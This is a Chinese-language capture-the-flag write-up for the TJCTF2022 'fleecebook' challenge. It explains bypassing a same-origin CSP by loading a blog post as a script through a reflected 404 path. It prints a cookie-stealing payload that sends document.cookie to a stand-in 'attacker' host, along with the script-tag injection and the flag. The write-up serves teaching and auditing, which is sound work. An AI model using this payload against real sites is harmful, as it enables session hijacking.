# TJCTF2022 fleecebook

## 题目简述

博客允许创建帖子，并以 Jinja 模板转义标题和正文。站点设置了只允许同源脚本的 CSP，还启用了 Trusted Types，看似阻止普通 XSS；但 404 处理器会把 URL 路径未经转义地反射到 HTML，且任意帖子的响应都可以被浏览器作为同源外部 JavaScript 加载。两处行为组合后可窃取管理员 Cookie。

## 解题过程

先创建一个内容在 JavaScript 语境中有效的帖子。标题写入跳转语句并开始块注释，正文结束注释：

```text
title:   location=`https://attacker/`+encodeURIComponent(document.cookie)/*
content: */
```

帖子页面正常浏览时只是文本；作为 `<script src>` 加载时，响应主体会被按 JavaScript 解释。中间由模板插入的 `<br>` 等 HTML 被 `/* ... */` 注释遮蔽，实际效果是把 Cookie 编码后拼到攻击者 URL。

然后把指向该帖子的同源脚本标签放进请求路径，并对整段路径 URL 编码：

```html
<script src="/post/帖子UUID"></script>
```

访问不存在的该路径会进入 404 处理器，其响应直接包含 `request.path`，浏览器由此创建脚本元素。脚本来源仍是本站，满足 `script-src 'self'`；管理员机器人打开恶意 URL 后执行帖子内容并向攻击者发送 Cookie。解码回调即可得到 `tjctf{s3a_e5s_p3A_5a1d68d16c7e1d2a}`。

## 方法总结

CSP 判断的是资源来源，而不是同源响应是否真的应该成为脚本。当站内任意内容可被塑造成有效 JavaScript，再配合一个 HTML 注入点时，`'self'` 仍可能被绕过。审计时应跨端点组合响应：模板转义只保证当前 HTML 语境安全，不能保证同一响应被外部脚本标签加载时仍安全。
